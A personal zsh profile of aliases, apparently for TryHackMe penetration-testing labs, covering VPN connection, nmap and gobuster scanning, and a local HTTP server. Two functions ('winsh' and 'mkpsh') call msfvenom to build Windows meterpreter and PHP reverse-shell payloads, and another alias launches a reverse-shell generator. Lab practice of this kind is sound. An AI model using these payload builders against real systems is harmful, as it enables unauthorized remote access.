export thm='/media/sf_thm'
export wrdls='/usr/share/wordlists'
export secls='/usr/share/seclists'

# manage ssh session
alias sshon='sudo systemctl start ssh.socket'
alias sshoff='sudo systemctl stop ssh.socket'

alias thm='sudo openvpn /media/sf_thm/thm.ovpn'

# display THM ip
export tip=$(ip -f inet addr show tun0 2>/dev/null | awk '/inet / {print $2}' | rev | cut -c 4- | rev)

# generate metasploit listener for windows
alias winsh='function _winsh(){
	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$1 lport=$2 -f $3 > $4.$3};
	_winsh'

# enumerate directories
alias gust='function _gust(){
	gobuster dir -u $1 -w $2};
	_gust'

# enumare network
alias scan='function _scan(){
	if [ $2=='ms' ]; then
		ms='-Pn'
	else
		ms=''
	fi
	sudo nmap -sC -sV -O -A -oN nmap.txt $ms $1;
	less -R nmap.txt};
	_scan'

# edit profile
alias ucfg='nano ~/.zshrc'
# refresh profile
alias uref='source ~/.zshrc'

# shortcuts
alias ida='/home/thm/idafree-7.7/ida64'
alias hid2='/media/sf_thm/tools/scripts/hashid.py'
alias pysrv='python3 -m http.server 8090'
alias rsg='python ~/Downloads/revshellgen/revshellgen.py'
alias msfg='java -jar /media/sf_thm/tools/armitage/release/unix/armitage.jar'

alias rot13="tr 'A-Za-z' 'N-ZA-Mn-za-m'"
alias rot47="tr '\!-~' 'P-~\!-O'"

# generate reverse php shell
alias mkpsh='f(){msfvenom -p php/reverse_php LHOST="$1" LPORT="$2" -f raw > $3.php;unset -f f;};f'
